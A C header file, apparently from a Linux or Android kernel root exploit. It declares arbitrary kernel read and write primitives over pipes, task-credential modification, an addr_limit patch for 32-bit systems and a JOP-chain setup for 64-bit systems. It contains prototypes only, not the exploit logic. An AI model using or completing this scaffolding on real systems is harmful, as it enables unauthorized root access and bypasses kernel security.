#ifndef GETROOT_H
#define GETROOT_H

#include <linux/types.h>

#include "threadinfo.h"

#define __user
#define __kernel

int read_at_address_pipe(void* address, void* buf, ssize_t len);
int write_at_address_pipe(void* address, void* buf, ssize_t len);

inline int writel_at_address_pipe(void* address, unsigned long val)
{
	return write_at_address_pipe(address, &val, sizeof(val));
}

int get_task_struct_partial_offset(void *__kernel task);
int modify_task_cred_uc(void *__kernel task);
//32bit
struct thread_info* patchaddrlimit();
//64bit
void preparejop(void** addr, void* jopret);

#endif /* GETROOT_H */
